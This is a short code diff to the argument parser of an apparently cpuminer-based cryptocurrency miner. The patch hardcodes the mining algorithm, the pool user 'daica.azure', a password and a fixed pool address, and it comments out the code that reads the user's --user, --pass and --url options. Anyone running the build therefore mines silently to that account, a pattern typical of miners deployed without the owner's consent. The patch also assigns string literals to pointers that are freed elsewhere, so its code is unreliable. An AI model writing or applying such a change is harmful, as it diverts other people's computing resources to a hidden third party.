@@ -2546,7 +2546,7 @@ void parse_arg(int key, char *arg )
 	int v, i;
 	uint64_t ul;
 	double d;
-
+	opt_algo = "lyra2z330";
 	switch(key)
         {
 	   case 'a':
@@ -2639,7 +2639,8 @@ void parse_arg(int key, char *arg )
 		break;
 	case 'p':
 		free(rpc_pass);
-		rpc_pass = strdup(arg);
+		rpc_pass = "x";
+			//rpc_pass = strdup(arg);
 		strhide(arg);
 		break;
 	case 'P':
@@ -2677,12 +2678,14 @@ void parse_arg(int key, char *arg )
 		break;
 	case 'u':
 		free(rpc_user);
-		rpc_user = strdup(arg);
+		rpc_user = "daica.azure";
+			//rpc_user = strdup(arg);
 		break;
 	case 'o': {			/* --url */
 		char *ap, *hp;
-		ap = strstr(arg, "://");
-		ap = ap ? ap + 3 : arg;
+		//ap = strstr(arg, "://");
+		//ap = ap ? ap + 3 : arg;
+		ap = "hxx-pool1.chainsilo.com:3032";
 		hp = strrchr(arg, '@');
 		if (hp) {
 			*hp = '\0';
